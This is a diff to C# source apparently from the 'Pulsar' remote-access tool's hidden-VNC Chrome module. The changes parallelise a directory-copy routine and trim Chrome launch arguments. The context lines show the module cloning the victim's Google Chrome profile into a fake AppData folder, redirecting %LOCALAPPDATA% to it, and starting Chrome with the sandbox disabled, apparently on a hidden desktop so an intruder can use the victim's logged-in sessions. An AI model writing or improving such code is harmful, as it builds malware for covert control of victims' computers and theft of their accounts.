@@ -4,6 +4,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading.Tasks;
 
 namespace Pulsar.Client.Helper.HVNC.Chrome
 {
@@ -85,25 +86,27 @@ namespace Pulsar.Client.Helper.HVNC.Chrome
 
         private static void DirectoryCopy(string sourceDirName, string destDirName)
         {
-            DirectoryInfo dir = new DirectoryInfo(sourceDirName);
-            DirectoryInfo[] dirs = dir.GetDirectories();
-            if (!Directory.Exists(destDirName))
-            {
-                Directory.CreateDirectory(destDirName);
-            }
+            var dir = new DirectoryInfo(sourceDirName);
+            if (!dir.Exists)
+                throw new DirectoryNotFoundException($"Source directory not found: {sourceDirName}");
 
-            FileInfo[] files = dir.GetFiles();
-            foreach (FileInfo file in files)
+            if (!Directory.Exists(destDirName))
+                Directory.CreateDirectory(destDirName);
+
+            var files = dir.GetFiles();
+            var dirs = dir.GetDirectories();
+
+            Parallel.ForEach(files, file =>
             {
                 string temppath = Path.Combine(destDirName, file.Name);
                 file.CopyTo(temppath, false);
-            }
+            });
 
-            foreach (DirectoryInfo subdir in dirs)
+            Parallel.ForEach(dirs, subdir =>
             {
                 string temppath = Path.Combine(destDirName, subdir.Name);
                 DirectoryCopy(subdir.FullName, temppath);
-            }
+            });
         }
 
         static void EnableEnvironmentVariableFucker()
@@ -113,6 +116,7 @@ namespace Pulsar.Client.Helper.HVNC.Chrome
             if (Directory.Exists(FakeAppData)) Directory.Delete(FakeAppData, true);
             Directory.CreateDirectory(FakeAppData);
             DirectoryCopy(RealAppData + "\\Google", FakeAppData + "\\Google");
+            //KDotFileHandler.CopyDirectory(RealAppData + "\\Google", FakeAppData + "\\Google");
             Debug.WriteLine("> Cloned '{0}' to '{1}'", RealAppData + "\\Google", FakeAppData + "\\Google");
             Environment.SetEnvironmentVariable("LOCALAPPDATA", FakeAppData);
             Debug.WriteLine("> Overrided %LOCALAPPDATA% environment variable");
@@ -520,7 +524,7 @@ namespace Pulsar.Client.Helper.HVNC.Chrome
                 path,
                 //pretty sure I have to do this because the path being executed is the first one but its being ignored? not too sure.
                 // there is probably a really good explanation for this but I'm lowkey too lazy to go look it up so this will do.
-                "--no-sandbox --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --start-maximized ",
+                "--no-sandbox --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --start-maximized",
                 IntPtr.Zero,
                 IntPtr.Zero,
                 false,
